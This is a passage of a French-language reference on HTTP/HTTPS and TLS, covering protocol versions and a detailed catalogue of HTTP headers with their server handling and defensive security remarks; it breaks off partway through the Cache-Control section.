---
title: "Protocole HTTP & HTTPS : Mécanismes, TLS et Attaques"
description: "Anatomie complète des protocoles HTTP/1.1, HTTP/2, HTTP/3 et du handshake TLS, avec analyse des vecteurs d'attaque et recommandations de hardening."
tags:
  - http
  - https
  - tls
  - web-security
  - network
  - cryptography
  - request-smuggling
  - mitm
  - hsts
  - tls-downgrade
  - crlf-injection
  - pfs
---

# Protocole HTTP & HTTPS — Mécanismes, Handshake TLS et Modèles de Menaces

!!! warning "Cadre légal"
    Les techniques offensives décrites dans ce document ne doivent être mises en œuvre que dans
    un cadre légal explicite : laboratoire isolé, CTF, ou test d'intrusion couvert par une
    autorisation écrite.

---

## 1. Résumé exécutif & contexte

### HTTP/HTTPS dans le modèle OSI

**HTTP** (*HyperText Transfer Protocol*) est le protocole de la **couche Application (L7)** du
modèle OSI. Il régit l'intégralité des échanges entre clients (navigateurs, APIs, scripts) et
serveurs web. Par défaut, il fonctionne en texte clair sur le port **TCP/80**, sans aucune
protection contre la lecture ou la modification en transit.

**HTTPS** = HTTP + **TLS** (*Transport Layer Security*), opérant sur le port **TCP/443**. TLS
se positionne entre la couche Transport (TCP) et la couche Application (HTTP), dans ce qui
correspond fonctionnellement à la couche Présentation (L6) du modèle OSI.

```text
Modèle OSI / TCP-IP — positionnement des protocoles :

┌─────────────────────────────────────────────────────────────┐
│  L7 Application  │  HTTP, HTTPS, DNS, SMTP, FTP ...         │
├─────────────────────────────────────────────────────────────┤
│  L6 Présentation │  TLS / SSL (chiffrement, certificats)    │
├─────────────────────────────────────────────────────────────┤
│  L5 Session      │  (gestion de sessions TCP)               │
├─────────────────────────────────────────────────────────────┤
│  L4 Transport    │  TCP (HTTP/1.1, HTTP/2) / UDP (HTTP/3)   │
├─────────────────────────────────────────────────────────────┤
│  L3 Réseau       │  IP (IPv4, IPv6)                         │
├─────────────────────────────────────────────────────────────┤
│  L2 Liaison      │  Ethernet, Wi-Fi (802.11), PPP ...       │
├─────────────────────────────────────────────────────────────┤
│  L1 Physique     │  Câble cuivre, fibre, signal radio ...   │
└─────────────────────────────────────────────────────────────┘

Note HTTP/3 : QUIC (protocole sous-jacent) encapsule TLS 1.3 directement dans UDP.
Il n'y a pas de couche TCP séparée ; la fiabilité est gérée par QUIC lui-même.
```

!!! note "HTTP vs HTTPS — différences fondamentales"
    | Propriété | HTTP | HTTPS |
    |---|---|---|
    | Port par défaut | 80 | 443 |
    | Chiffrement | Aucun (texte brut) | TLS (AES-GCM, ChaCha20-Poly1305) |
    | Intégrité | Aucune | AEAD (Authenticated Encryption) |
    | Authentification du serveur | Aucune | Certificat X.509 signé par une CA |
    | Résistance au MitM | Nulle | Forte (avec HSTS et validation de cert.) |
    | Confidentialité des cookies | Nulle | Garantie si flag `Secure` présent |

### Évolution des versions HTTP

```text
Chronologie des versions HTTP :

HTTP/0.9 (1991) ─── Protocole minimaliste, GET uniquement, pas d'en-têtes
       │
HTTP/1.0 (1996) ─── Ajout des en-têtes, codes de statut, types MIME
  RFC 1945        └─ Problème : une connexion TCP par requête (overhead)
       │
HTTP/1.1 (1997) ─── Connexions persistentes (Keep-Alive), pipelining,
  RFC 9112 (2022)    transfert chunked, hôtes virtuels (Host header obligatoire)
       │             Toujours en texte ASCII — inefficace sur les réseaux modernes
       │
HTTP/2  (2015)  ─── Couche de framing BINAIRE, multiplexage sur une seule
  RFC 7540           connexion TCP, compression HPACK des en-têtes, Server Push,
                     priorisation des flux (streams)
                 └─ Problème persistant : HOL blocking au niveau TCP (un paquet
                    perdu bloque tous les flux simultanés)
       │
HTTP/3  (2022)  ─── Remplace TCP par QUIC (UDP + fiabilité applicative),
  RFC 9114           TLS 1.3 intégré dans QUIC (0-RTT natif), résolution du
                     HOL blocking au niveau transport, migration de connexion
                     (changement d'IP sans interruption, ex : Wi-Fi → 4G)
```

!!! tip "HTTP/2 et le problème du Head-Of-Line Blocking"
    HTTP/2 multiplexe plusieurs flux sur une seule connexion TCP. Si un segment TCP est perdu,
    le mécanisme de retransmission TCP bloque **tous** les flux en attente — même ceux n'ayant
    aucun rapport avec le paquet perdu. HTTP/3 (QUIC) résout ce problème car la fiabilité est
    gérée par flux individuels au niveau applicatif.

---

## 2. Anatomie détaillée d'un échange HTTP

### 2.1 Structure d'une requête HTTP

```text
Syntaxe générale d'une requête HTTP/1.1 :

┌─ Ligne de commande ─────────────────────────────────────────┐
│  MÉTHODE  /chemin/ressource?param=val  HTTP/version \r\n    │
└─────────────────────────────────────────────────────────────┘
┌─ En-têtes (Headers) ────────────────────────────────────────┐
│  Nom-Header: valeur \r\n                                    │
│  ...                                                        │
│  \r\n   ← ligne vide obligatoire séparant headers et body   │
└─────────────────────────────────────────────────────────────┘
┌─ Corps (Body / Payload) ────────────────────────────────────┐
│  [données optionnelles selon la méthode]                    │
└─────────────────────────────────────────────────────────────┘
```

```http
GET /api/v1/users?role=admin HTTP/1.1
Host: api.example.com
Accept: application/json
Accept-Language: fr-FR,fr;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: keep-alive
Cookie: session=abc123def456; csrftoken=XYZ789
Cache-Control: no-cache

```

```http
POST /api/v1/login HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 47
Origin: https://app.example.com
Referer: https://app.example.com/login
X-CSRF-Token: XYZ789

{"email":"user@example.com","password":"S3cr3t!"}
```

### 2.2 Référence exhaustive des en-têtes HTTP

> **Légende des sens** : `REQ` = en-tête de requête (client → serveur) · `RÉP` = en-tête de réponse (serveur → client) · `REQ+RÉP` = utilisable dans les deux sens.
> **Portée** : cette référence couvre tous les en-têtes normalisés (RFC 9110/9111/9112/9113/9114, RFC 6265bis, RFC 7239, RFC 6454, RFC 6455, RFC 8246, RFC 8297, RFC 8470, RFC 9530…), les spécifications W3C/WHATWG (CSP, CORS, Fetch Metadata, Permissions Policy, Client Hints, Reporting…), les en-têtes *de facto* (`X-*`) et les en-têtes obsolètes encore rencontrés. Le registre IANA évolue : la liste officielle est sur <https://www.iana.org/assignments/http-fields/>.

---

#### 2.2.1 Règles générales de syntaxe

```text
Syntaxe d'un champ d'en-tête :

  nom-du-champ ":" OWS valeur OWS CRLF
       │                │
       │                └─ OWS = espaces / tabulations optionnels (ignorés)
       └─ token ASCII : lettres, chiffres, - _ . ! # $ % & ' * + ^ ` | ~
```

| Règle | Détail |
|---|---|
| **Insensibilité à la casse** | `Content-Type`, `content-type` et `CONTENT-TYPE` sont identiques (les **valeurs**, elles, peuvent être sensibles à la casse selon l'en-tête). |
| **HTTP/2 et HTTP/3** | Les noms sont **obligatoirement en minuscules**. La ligne de requête est remplacée par des **pseudo-en-têtes** : `:method`, `:scheme`, `:authority` (remplace `Host`), `:path`, et `:status` pour la réponse. |
| **Valeurs multiples** | Peuvent être fusionnées avec une virgule (`Accept: a, b`) ou répétées sur plusieurs lignes. **Exception : `Set-Cookie`** qui ne doit jamais être fusionné. |
| **Line folding** | Les valeurs sur plusieurs lignes (`obs-fold`) sont **interdites** depuis la RFC 7230 : un serveur doit les rejeter (400) ou les remplacer par un espace. |
| **Paramètres `q` (qualité)** | `;q=0.8` : poids relatif de 0 à 1 (3 décimales max). Défaut = 1. `q=0` = « refusé ». |
| **Structured Fields (RFC 9651)** | Syntaxe moderne pour de nombreux en-têtes récents : booléens `?1`/`?0`, chaînes `"…"`, tokens, octets `:base64:`, listes `a, b`, dictionnaires `k=v, k2`. |
| **Hop-by-hop vs end-to-end** | *Hop-by-hop* : concerne **un seul saut** (client↔proxy) et est supprimé par les intermédiaires (`Connection`, `Keep-Alive`, `Proxy-Authenticate`, `Proxy-Authorization`, `TE`, `Trailer`, `Transfer-Encoding`, `Upgrade`). *End-to-end* : transmis jusqu'au destinataire final. |
| **Préfixes réservés** | `Sec-*` et `Proxy-*` : **interdits en écriture** pour le JavaScript du navigateur (`fetch`/`XHR`), donc non falsifiables depuis une page web. `X-*` : historiquement « expérimental/non standard » (déprécié par la RFC 6648 mais toujours très répandu). |
| **Limites pratiques** | Pas de limite dans la RFC ; en pratique 8 à 16 Ko par en-tête / 32 à 64 Ko au total selon le serveur (Nginx : `large_client_header_buffers`, Apache : `LimitRequestFieldSize` = 8190). Dépassement → `431 Request Header Fields Too Large`. |

---

#### 2.2.2 Identification et contexte de la requête

##### `Host` — REQ
**Rôle :** indique le nom d'hôte (et le port si non standard) visé par le client. **Obligatoire en HTTP/1.1** ; permet l'*hébergement virtuel* (plusieurs sites sur une même IP).

```http
GET /index.html HTTP/1.1
Host: www.example.com:8443
```

**Traitement serveur :** le serveur (Nginx `server_name`, Apache `ServerName`/`ServerAlias`) compare la valeur à ses hôtes virtuels et sélectionne la configuration correspondante ; sans correspondance, il sert l'hôte « par défaut ». Absent ou en double en HTTP/1.1 → `400 Bad Request`.
**Sécurité :** s'il est réutilisé sans validation pour générer des liens (mails de réinitialisation de mot de passe, redirections), il permet le *Host Header Injection* / *cache poisoning*. Toujours valider contre une liste blanche.

##### `User-Agent` — REQ
**Rôle :** identifie le logiciel client (navigateur, bot, bibliothèque HTTP, version, OS).

```http
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
```

**Traitement serveur :** utilisé pour les statistiques, l'adaptation de contenu (mobile/desktop), la détection de bots ou le blocage. **Non fiable** (trivialement falsifiable). Les navigateurs modernes réduisent (*UA reduction*) la précision de cette chaîne au profit des **Client Hints** (§ 2.2.14).

##### `From` — REQ
**Rôle :** adresse e-mail de la personne responsable du client automatisé (robots d'indexation).

```http
From: webmaster@crawler.example.org
```

**Traitement serveur :** purement informatif (journalisation, contact en cas d'abus). Ne jamais l'utiliser pour authentifier.

##### `Referer` — REQ *(l'orthographe fautive est historique)*
**Rôle :** URL de la page d'origine d'où provient la requête. Son contenu est contrôlé par `Referrer-Policy` (§ 2.2.13).

```http
Referer: https://app.example.com/products?id=12
```

**Traitement serveur :** analytics, contrôle anti-hotlinking (`if ($http_referer !~ "example.com") { return 403; }`), défense CSRF secondaire. **Sécurité :** peut fuiter des tokens contenus dans l'URL ; peut être absent ou masqué → ne pas en dépendre seul.

##### `Origin` — REQ
**Rôle :** indique l'**origine** (`schéma://hôte:port`, sans chemin) qui initie la requête. Envoyé pour les requêtes CORS et les requêtes `POST`/`PUT`/`DELETE` cross-origin.

```http
POST /api/transfer HTTP/1.1
Host: bank.example.com
Origin: https://evil.example.net
```

**Traitement serveur :** le serveur compare `Origin` à sa liste d'origines autorisées : différente → `403` (défense CSRF) ou absence de header `Access-Control-Allow-Origin` (CORS). Valeur spéciale : `Origin: null` (documents sandboxés, `file://`, redirections cross-origin) → **ne jamais l'autoriser** aveuglément.

##### `Expect` — REQ
**Valeur unique définie :** `100-continue`.
**Rôle :** le client demande une confirmation avant d'envoyer un corps volumineux.

```http
PUT /upload HTTP/1.1
Host: files.example.com
Content-Length: 104857600
Expect: 100-continue
```

**Traitement serveur :** examine les en-têtes (auth, taille, type) puis répond soit `100 Continue` (le client envoie le corps), soit une erreur finale (`401`, `413`, `417 Expectation Failed` si l'attente n'est pas supportée), évitant de transférer 100 Mo pour rien.

##### `Max-Forwards` — REQ
**Rôle :** limite le nombre de sauts de proxy pour `TRACE` et `OPTIONS`.

```http
TRACE /diag HTTP/1.1
Max-Forwards: 3
```

**Traitement serveur :** chaque proxy décrémente la valeur ; à `0`, il répond lui-même au lieu de relayer.

##### `Upgrade-Insecure-Requests` — REQ
**Valeur :** `1`.
**Rôle :** le navigateur signale qu'il préfère une version HTTPS de la ressource.

```http
Upgrade-Insecure-Requests: 1
```

**Traitement serveur :** peut répondre par une redirection `307` vers `https://` (et généralement un en-tête `Vary: Upgrade-Insecure-Requests`).

##### `Priority` — REQ+RÉP (RFC 9218)
**Rôle :** *Extensible Prioritization Scheme* pour HTTP/2 et HTTP/3.
**Paramètres :** `u=0…7` (urgence, **0 = la plus haute**, défaut 3) ; `i` (booléen, ressource « incrémentale » pouvant être affichée au fur et à mesure, comme une image progressive).

```http
Priority: u=1, i
```

**Traitement serveur :** l'ordonnanceur H2/H3 alloue la bande passante en priorité aux flux d'urgence basse (`u=0`). Le serveur/CDN peut aussi envoyer `Priority` en réponse pour ajuster ce que voit le client.

##### `Early-Data` — REQ (RFC 8470)
**Valeur :** `1`. Ajouté par un proxy inverse quand la requête arrive en **TLS 1.3 0-RTT** (rejouable).

```http
Early-Data: 1
```

**Traitement serveur :** pour les requêtes non idempotentes (POST…), le back-end doit répondre `425 Too Early` afin que le client réessaie après la fin du handshake ; sinon risque de **rejeu** (double paiement, etc.).

##### `Prefer` (REQ) / `Preference-Applied` (RÉP) — RFC 7240
**Valeurs :** `return=minimal` (réponse sans corps), `return=representation` (renvoyer la ressource complète), `respond-async` (traitement asynchrone → `202`), `wait=<secondes>` (durée maximale d'attente), `handling=strict` (rejeter si une préférence est inconnue) / `handling=lenient` (l'ignorer).

```http
POST /orders HTTP/1.1
Prefer: return=minimal, wait=10
```
```http
HTTP/1.1 201 Created
Preference-Applied: return=minimal
```

**Traitement serveur :** il applique les préférences qu'il comprend et liste celles réellement retenues dans `Preference-Applied`. Ce sont des **préférences**, jamais des obligations.

##### `Idempotency-Key` — REQ (draft IETF, popularisé par Stripe)
**Rôle :** identifiant unique (UUID) permettant de rejouer un `POST` sans le dupliquer.

```http
POST /payments HTTP/1.1
Idempotency-Key: 8e03978e-40d5-43e8-bc93-6894a57f9324
```

**Traitement serveur :** stocke la clé + le résultat ; si la même clé revient, renvoie la **réponse mémorisée** sans ré-exécuter l'opération. Si la même clé est rejouée avec un corps différent → `422`.

##### `Purpose` / `Sec-Purpose` — REQ
**Rôle :** signale une requête spéculative. `Purpose: prefetch` (déprécié) ; `Sec-Purpose: prefetch` ou `prefetch;prerender` (actuel).

```http
Sec-Purpose: prefetch;prerender
```

**Traitement serveur :** peut refuser (`503`) ou ne pas compter la requête dans les statistiques ; ne doit pas déclencher d'effets de bord.

---

#### 2.2.3 Négociation de contenu

*Principe : le client déclare ses capacités, le serveur choisit une représentation et l'indique dans `Content-Type`, `Content-Language`, `Content-Encoding`, en ajoutant `Vary` pour les caches.*

##### `Accept` — REQ
**Rôle :** types MIME acceptés. Syntaxe : `type/sous-type;q=poids`.
**Valeurs possibles :**

| Forme | Signification |
|---|---|
| `type/sous-type` | Type précis (`application/json`, `text/html`, `image/webp`…) |
| `type/*` | Tous les sous-types d'un type (`image/*`) |
| `*/*` | Tout type accepté |
| `;q=0…1` | Préférence (1 = maximal, 0 = refus) |

```http
Accept: text/html, application/xhtml+xml;q=0.9, application/json;q=0.8, */*;q=0.1
```

**Traitement serveur :** classe les représentations disponibles par `q` et spécificité (le plus précis l'emporte) ; sert la meilleure, ou `406 Not Acceptable` si aucune ne convient (beaucoup d'API répondent le format par défaut à la place).

##### `Accept-Language` — REQ
**Rôle :** langues préférées (tags BCP 47).

```http
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
```

**Traitement serveur :** choisit la traduction correspondante (`fr-CH` puis `fr`, sinon `en`…), la déclare dans `Content-Language` et ajoute `Vary: Accept-Language`. `*` = n'importe quelle autre langue.

##### `Accept-Encoding` — REQ
**Rôle :** algorithmes de compression acceptés pour le corps de la réponse.
**Valeurs possibles :**

| Valeur | Signification |
|---|---|
| `gzip` | Compression GZIP (RFC 1952), universelle |
| `deflate` | Format zlib/DEFLATE (implémentations parfois incohérentes) |
| `br` | Brotli — meilleur taux, surtout pour du texte, requiert HTTPS dans les navigateurs |
| `zstd` | Zstandard — rapide, bon taux |
| `compress` | LZW historique (quasi disparu) |
| `dcb` / `dcz` | Compression par dictionnaire (*Compression Dictionary Transport* : Brotli / Zstd) |
| `identity` | Aucune compression |
| `*` | Tout encodage non listé explicitement |
| `;q=0` | Refuse cet encodage (`identity;q=0` = refuse la non-compression) |

```http
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
```

**Traitement serveur :** compresse la réponse avec l'algorithme retenu (`Content-Encoding: br`) et ajoute `Vary: Accept-Encoding`. Rien d'acceptable → `406` (rare, souvent il renvoie `identity`).

##### `Accept-Charset` — REQ *(obsolète)*
**Rôle :** jeux de caractères acceptés. Ignoré par les navigateurs modernes (UTF-8 partout).

```http
Accept-Charset: utf-8, iso-8859-1;q=0.5
```

**Traitement serveur :** la plupart l'ignorent ; le charset est indiqué dans `Content-Type; charset=utf-8`.

##### `Accept-Datetime` — REQ (RFC 7089, Memento)
**Rôle :** demande une version **archivée** d'une ressource à une date donnée.

```http
Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT
```

**Traitement serveur :** un serveur d'archives (Wayback Machine) redirige vers l'instantané le plus proche (`Memento-Datetime` en réponse).

##### `Accept-Ranges` — RÉP
**Valeurs :** `bytes` (le serveur supporte `Range`) ou `none` (non supporté).

```http
Accept-Ranges: bytes
```

**Traitement client :** peut reprendre un téléchargement ou faire du streaming vidéo par tranches.

##### `Accept-Patch` / `Accept-Post` — RÉP
**Rôle :** formats de corps acceptés respectivement pour `PATCH` et `POST` sur cette ressource (souvent en réponse à `OPTIONS`).

```http
Accept-Patch: application/merge-patch+json, application/json-patch+json
Accept-Post: application/json, multipart/form-data
```

##### `Vary` — RÉP
**Rôle :** liste les en-têtes de **requête** qui ont influencé la réponse ; sert de clé secondaire pour les caches.
**Valeurs :** noms d'en-têtes (`Accept-Encoding`, `Accept-Language`, `Origin`, `Cookie`, `User-Agent`…) ou `*` (la réponse dépend de facteurs inconnus → **non cachable**).

```http
Vary: Accept-Encoding, Accept-Language, Origin
```

**Traitement cache :** stocke une variante distincte par combinaison de valeurs de ces en-têtes. Oublier `Vary: Origin` avec CORS dynamique provoque des erreurs de cache poisoning.

##### `Content-Language` — RÉP (et REQ)
**Rôle :** langue(s) de l'audience visée par le contenu.

```http
Content-Language: fr-CA
```

---

#### 2.2.4 Représentation et corps du message

##### `Content-Type` — REQ+RÉP
**Rôle :** type MIME du corps + paramètres.
**Paramètres :** `charset=utf-8` ; `boundary=…` (multipart) ; `version`, `profile`, etc.
**Valeurs courantes :**

| Valeur | Usage |
|---|---|
| `text/html`, `text/plain`, `text/css`, `text/csv`, `text/javascript` | Documents textuels |
| `application/json`, `application/ld+json`, `application/problem+json` | JSON / JSON-LD / erreurs API (RFC 9457) |
| `application/xml`, `text/xml`, `application/soap+xml` | XML |
| `application/x-www-form-urlencoded` | Formulaire HTML classique (`a=1&b=2`) |
| `multipart/form-data; boundary=----X` | Formulaire avec fichiers |
| `multipart/byteranges` | Réponses 206 multi-plages |
| `application/octet-stream` | Binaire générique (téléchargement) |
| `application/pdf`, `application/zip`, `application/gzip` | Fichiers |
| `image/png`, `image/jpeg`, `image/webp`, `image/avif`, `image/svg+xml` | Images |
| `audio/*`, `video/mp4`, `video/webm` | Média |
| `text/event-stream` | Server-Sent Events |
| `application/x-ndjson` | Flux JSON ligne par ligne |
| `application/grpc`, `application/graphql-response+json` | gRPC, GraphQL |
| `application/wasm` | WebAssembly |

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
```

**Traitement serveur :** choisit le *parser* du corps (JSON, multipart, urlencoded). Type inconnu → `415 Unsupported Media Type`. **Sécurité :** une divergence entre le type annoncé et le contenu réel permet le *MIME sniffing* → à combiner avec `X-Content-Type-Options: nosniff`.

##### `Content-Length` — REQ+RÉP
**Rôle :** taille du corps en **octets**.

```http
Content-Length: 47
```

**Traitement serveur :** lit exactement N octets. Incohérence avec `Transfer-Encoding` ou entre plusieurs `Content-Length` → **HTTP Request Smuggling** ; les serveurs stricts rejettent (`400`).

##### `Content-Encoding` — REQ+RÉP
**Rôle :** compression appliquée au **corps** (que le récepteur doit décoder). Valeurs identiques à `Accept-Encoding` : `gzip`, `deflate`, `br`, `zstd`, `compress`, `dcb`, `dcz`, `identity`.

```http
Content-Encoding: gzip
```

**Traitement :** le client décompresse avant d'interpréter le `Content-Type`. Les multiples encodages sont listés dans l'ordre d'application (`gzip, br`).

##### `Content-Location` — RÉP
**Rôle :** URL directe de la représentation renvoyée (utile après négociation ou après un `POST`).

```http
Content-Location: /docs/rapport.fr.html
```

##### `Content-Disposition` — RÉP (et parties multipart REQ)
**Valeurs :**

| Valeur | Effet |
|---|---|
| `inline` | Affichage dans la page/onglet (défaut) |
| `attachment` | Téléchargement forcé |
| `attachment; filename="rapport.pdf"` | Nom proposé à l'enregistrement |
| `filename*=UTF-8''r%C3%A9sum%C3%A9.pdf` | Nom encodé RFC 5987 (accents) |
| `form-data; name="champ"; filename="a.png"` | Dans un corps `multipart/form-data` |

```http
Content-Disposition: attachment; filename="facture-2026.pdf"
```

**Sécurité :** valider/normaliser `filename` (path traversal `../`, caractères CRLF) côté serveur.

##### `Content-Range` — RÉP
**Syntaxe :** `bytes début-fin/total` ou `bytes */total` (avec `416`).

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 200-1023/146515
Content-Length: 824
```

##### `Transfer-Encoding` — REQ+RÉP (hop-by-hop)
**Valeurs :** `chunked` (corps envoyé par morceaux, taille avant chaque morceau, terminé par `0\r\n\r\n`), `gzip`, `deflate`, `compress` (`identity` retiré). **Absent en HTTP/2 et HTTP/3.**

```http
HTTP/1.1 200 OK
Transfer-Encoding: chunked

7\r\nMozilla\r\n9\r\nDeveloper\r\n0\r\n\r\n
```

**Traitement :** le récepteur recompose le corps morceau par morceau. **Sécurité :** conflit `Content-Length` / `Transfer-Encoding` = vecteur de *Request Smuggling* (variantes CL.TE, TE.CL, TE.TE) ; la RFC impose que `Transfer-Encoding` prime et que le serveur refuse ou normalise.

##### `Trailer` — REQ+RÉP
**Rôle :** annonce les champs qui seront envoyés **après** le corps (avec `chunked`).

```http
Trailer: Server-Timing, Repr-Digest
```

##### `TE` — REQ (hop-by-hop)
**Valeurs :** `trailers` (accepte les trailers), `gzip`, `deflate`, `compress` avec `q`. Utilisé en pratique pour gRPC : `TE: trailers`.

##### `Content-Digest` / `Repr-Digest` / `Want-Content-Digest` / `Want-Repr-Digest` — REQ+RÉP (RFC 9530)
**Rôle :** empreinte du **contenu transmis** (`Content-Digest`) ou de la **représentation** (`Repr-Digest`) ; les `Want-*` demandent au pair d'en calculer une.
**Algorithmes :** `sha-256`, `sha-512` (les anciens `md5`, `sha`, `unixsum`, `unixcksum`, `adler`, `crc32c` sont déconseillés).

```http
Content-Digest: sha-256=:X48E9qOokqqrvdts8nOJRJN3OWDUoyWxBf7kbu9DBPE=:
Want-Repr-Digest: sha-256=10, sha-512=3
```

**Traitement serveur :** recalcule l'empreinte et rejette (`400`) si elle diffère → intégrité du corps. Remplace `Digest`/`Want-Digest` (obsolètes) et `Content-MD5` (retiré).

---

#### 2.2.5 Authentification et autorisation

##### `Authorization` — REQ
**Rôle :** identifiants de l'utilisateur pour la ressource ciblée. Syntaxe : `<schéma> <credentials>`.
**Schémas possibles :**

| Schéma | Format / fonctionnement |
|---|---|
| `Basic` | `base64(user:password)` — **non chiffré**, HTTPS obligatoire |
| `Bearer` | Jeton opaque ou JWT (OAuth 2.0, RFC 6750) |
| `Digest` | Hachage challenge-réponse (`username`, `realm`, `nonce`, `uri`, `response`, `qop`, `nc`, `cnonce`, `algorithm`) |
| `Negotiate` | Kerberos / SPNEGO (Active Directory) |
| `NTLM` | Protocole Microsoft (obsolète) |
| `DPoP` | Jeton lié à une clé (`DPoP` proof dans un en-tête séparé) |
| `AWS4-HMAC-SHA256` | Signature AWS Signature V4 |
| `SCRAM-SHA-256`, `Mutual`, `HOBA`, `vapid`, `OAuth` (1.0a) | Schémas spécialisés (RFC 7804, 8120, 7486, 8292…) |

```http
GET /api/me HTTP/1.1
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Traitement serveur :** extrait le schéma, valide le jeton (signature JWT, expiration `exp`, audience `aud`, scopes) ou le compare à sa base. Échec → `401 Unauthorized` + `WWW-Authenticate` ; authentifié mais non autorisé → `403 Forbidden`.

##### `WWW-Authenticate` — RÉP (avec `401`)
**Rôle :** défie le client en indiquant le(s) schéma(s) acceptés.
**Paramètres selon le schéma :**

| Schéma | Paramètres |
|---|---|
| `Basic` | `realm="zone"`, `charset="UTF-8"` |
| `Bearer` | `realm`, `scope`, `error` (`invalid_request`, `invalid_token`, `insufficient_scope`), `error_description`, `error_uri` |
| `Digest` | `realm`, `nonce`, `opaque`, `algorithm` (`MD5`, `SHA-256`, `SHA-512-256`), `qop` (`auth`, `auth-int`), `stale=true/false`, `domain`, `userhash` |
| `Negotiate` | jeton base64 optionnel |

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api", error="invalid_token", error_description="expired"
```

##### `Proxy-Authenticate` (RÉP, `407`) / `Proxy-Authorization` (REQ)
Même mécanique que ci-dessus, mais entre le client et un **proxy** (hop-by-hop).

```http
HTTP/1.1 407 Proxy Authentication Required
Proxy-Authenticate: Basic realm="corp-proxy"
```
```http
Proxy-Authorization: Basic dXNlcjpwYXNz
```

##### `Authentication-Info` / `Proxy-Authentication-Info` — RÉP
**Rôle :** informations post-authentification (Digest : `nextnonce`, `rspauth`, `qop`, `cnonce`, `nc`).

```http
Authentication-Info: nextnonce="dcd98b7102dd2f0e8b11d0f600bfb0c093"
```

##### `X-Api-Key` — REQ *(de facto)*
Clé d'API statique dans un en-tête personnalisé ; le serveur la retrouve dans sa table de clés et applique quotas/permissions. À traiter comme un secret (jamais dans l'URL).

##### `Signature` / `Signature-Input` / `Accept-Signature` — REQ+RÉP (RFC 9421)
**Rôle :** *HTTP Message Signatures* : signature de composants choisis de la requête/réponse.

```http
Signature-Input: sig1=("@method" "@authority" "content-digest");created=1735000000;keyid="k1";alg="ed25519"
Signature: sig1=:YmFzZTY0c2lnbmF0dXJl...:
```

**Traitement serveur :** reconstruit la « base de signature » à partir des composants listés et vérifie avec la clé identifiée par `keyid`.

---

#### 2.2.6 Cookies

##### `Cookie` — REQ
**Rôle :** renvoie au serveur les cookies stockés qui correspondent au domaine, chemin, schéma et politique `SameSite`.

```http
Cookie: session=abc123def456; csrftoken=XYZ789
```

**Traitement serveur :** le framework parse les paires `nom=valeur`, retrouve la session (`session` → store Redis/BDD). Un seul en-tête `Cookie` contient tous les cookies séparés par `; `.

##### `Set-Cookie` — RÉP
**Rôle :** demande au navigateur de stocker un cookie. **Un en-tête `Set-Cookie` par cookie** (jamais fusionnés).

```http
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

**Attributs et valeurs possibles :**

| Attribut | Valeurs | Effet |
|---|---|---|
| `nom=valeur` | chaîne sans espace, `;`, `,` | Contenu du cookie |
| `Expires` | date HTTP (`Wed, 21 Oct 2026 07:28:00 GMT`) | Date d'expiration absolue |
| `Max-Age` | entier (secondes) ; `0` ou négatif = **suppression** | Durée de vie relative — **prioritaire sur `Expires`** |
| *(ni l'un ni l'autre)* | — | Cookie de **session** (supprimé à la fermeture du navigateur) |
| `Domain` | `example.com` | Cookie envoyé au domaine **et à tous ses sous-domaines**. Omis = hôte exact seulement (plus sûr) |
| `Path` | `/`, `/app` | Préfixe de chemin pour lequel le cookie est envoyé |
| `Secure` | *(drapeau)* | Envoyé **uniquement en HTTPS** |
| `HttpOnly` | *(drapeau)* | **Inaccessible au JavaScript** (`document.cookie`) → limite le vol par XSS |
| `SameSite` | `Strict`, `Lax`, `None` | Contrôle l'envoi dans les contextes inter-sites (détail ci-dessous) |
| `Partitioned` | *(drapeau, avec `Secure`)* | Cookie **cloisonné** par site de premier niveau (CHIPS) — utile pour les widgets tiers sans cookie tiers |
| `Priority` | `Low`, `Medium`, `High` | Priorité d'éviction (Chrome, non standard) |

**Valeurs de `SameSite` :**

| Valeur | Comportement |
|---|---|
| `Strict` | Cookie envoyé **uniquement** si la requête vient du même site (*same-site*). Jamais lors d'un clic sur un lien externe → protection CSRF maximale, mais l'utilisateur arrivant depuis un lien externe apparaît « déconnecté » à la 1ʳᵉ page. |
| `Lax` | Comme `Strict`, **sauf** pour les navigations de haut niveau avec une méthode « sûre » (`GET`) : un lien externe conserve la session. Bloqué pour `POST` cross-site, `iframe`, `fetch`, images. **Valeur par défaut des navigateurs modernes** quand l'attribut est omis. |
| `None` | Cookie envoyé dans **tous** les contextes (tiers inclus). **Exige `Secure`**. À réserver aux cas d'intégration inter-sites (SSO, widgets, paiement). |

> ⚠️ *Same-site ≠ same-origin.* Le **site** = schéma + domaine enregistrable (eTLD+1) : `app.example.com` et `api.example.com` sont *same-site* mais *cross-origin*.

**Préfixes de nom (contraintes vérifiées par le navigateur) :**

| Préfixe | Contraintes imposées |
|---|---|
| `__Secure-` | Doit avoir `Secure` et être posé depuis une page HTTPS |
| `__Host-` | `Secure` + `Path=/` + **pas de `Domain`** → lié à l'hôte exact, non écrasable par un sous-domaine |
| `__Http-` | `Secure` + `HttpOnly` (posé côté serveur uniquement) |
| `__Host-Http-` | Combinaison de `__Host-` et `__Http-` |

**Traitement navigateur/serveur :** le serveur émet, le navigateur valide les attributs et rejette un cookie invalide ; aux requêtes suivantes il applique les règles de portée (domaine, chemin, schéma, SameSite) avant d'ajouter l'en-tête `Cookie`. Suppression : renvoyer le même nom/Domain/Path avec `Max-Age=0`.

---

#### 2.2.7 Cache et requêtes conditionnelles

##### `Cache-Control` — REQ+RÉP
**Rôle :** directives de mise en cache (navigateur, proxys, CDN).
**Directives de réponse :**

| Directive | Effet |
|---|---|
| `max-age=N` | Réponse **fraîche** pendant N secondes |
